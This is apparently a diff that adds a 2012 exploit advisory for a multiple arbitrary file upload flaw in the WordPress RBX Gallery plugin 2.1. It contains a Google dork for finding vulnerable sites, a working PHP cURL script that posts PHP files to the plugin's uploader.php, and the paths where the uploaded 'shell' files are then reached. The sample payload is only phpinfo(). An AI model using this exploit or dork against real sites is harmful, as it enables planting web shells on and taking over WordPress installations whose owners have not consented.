@@ -1,0 +1,42 @@
+##################################################
+# Description : Wordpress Plugins - RBX Gallery Multiple Arbitrary File 
+Upload Vulnerability
+# Version : 2.1
+# Link : http://wordpress.org/extend/plugins/rbxgallery/
+# Plugins : http://downloads.wordpress.org/plugin/rbxgallery.2.1.zip
+# Date : 03-06-2012
+# Google Dork : inurl:/wp-content/plugins/rbxgallery/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php";
+$uploadfile2="db.php";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/rbxgallery/uploader.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('images[0]'=>"@$uploadfile",
+                'images[1]'=>"@$uploadfile2",
+                'Submit'=>'submit'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/uploads/rbxslider/lo.php
+http://www.exemple.com/wordpress/wp-content/uploads/rbxslider/db.php
+
+lo.php
+<?php
+phpinfo();
+?>
